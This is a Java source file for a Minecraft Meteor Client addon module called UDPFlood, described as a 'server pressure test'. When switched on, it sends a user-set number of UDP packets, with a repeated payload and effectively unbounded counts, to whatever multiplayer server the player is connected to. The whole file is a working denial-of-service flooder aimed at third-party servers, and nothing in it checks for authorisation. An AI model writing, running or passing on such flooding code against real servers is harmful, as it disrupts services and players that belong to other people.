package me.chirin.zeitgeist.modules;

import me.chirin.zeitgeist.Zeitgeist;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.settings.StringSetting;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ServerAddress;
import net.minecraft.client.network.ServerInfo;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class UDPFlood extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<String> payloadString = sgGeneral.add(new StringSetting.Builder()
        .name("payload")
        .description("The custom payload to be sent to the server.")
        .defaultValue("ded")
        .build()
    );

    private final Setting<Integer> requestCount = sgGeneral.add(new IntSetting.Builder()
        .name("requests")
        .description("The amount of requests to be sent to the server.")
        .min(1)
        .sliderMax(Integer.MAX_VALUE)
        .defaultValue(100)
        .build()
    );

    private final Setting<Integer> requestRepeatCount = sgGeneral.add(new IntSetting.Builder()
        .name("request-repeat-count")
        .description("The number of times your payload string should be duplicated before being sent.")
        .min(1)
        .sliderMax(Integer.MAX_VALUE)
        .defaultValue(100)
        .build()
    );

    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public UDPFlood() {
        super(Zeitgeist.CATEGORY, "uDP-flood", "Server pressure test");
    }

    @EventHandler
    public void onActivate() {
        ServerInfo server = mc.getCurrentServerEntry();
        if (mc.isInSingleplayer() || server == null) {
            error("You must be on a server to do this.");
            toggle();
            return;
        }
        String ip = ServerAddress.parse(server.address).getAddress();
        int port = ServerAddress.parse(server.address).getPort();
        executor.execute(() -> floodServer(ip, port));
    }

    private void floodServer(String ip, int port) {
        info("Starting UDP Flooder on server: " + ip + ":" + port);
        long totalDataSent = 0;
        try (DatagramSocket socket = new DatagramSocket()) {
            byte[] payload = payloadString.get().repeat(requestRepeatCount.get()).getBytes(StandardCharsets.UTF_8);
            InetAddress serverAddress = InetAddress.getByName(ip);

            for (int i = 0; i < requestCount.get(); i++) {
                DatagramPacket packet = new DatagramPacket(payload, payload.length, serverAddress, port);
                socket.send(packet);
                totalDataSent += payload.length;
            }
        } catch (IOException e) {
            error("Error occurred: " + e + ", toggling.");
            toggle();
            return;
        }

        info("Finished, Total data sent: " + totalDataSent + " bytes");
        toggle();
    }
}
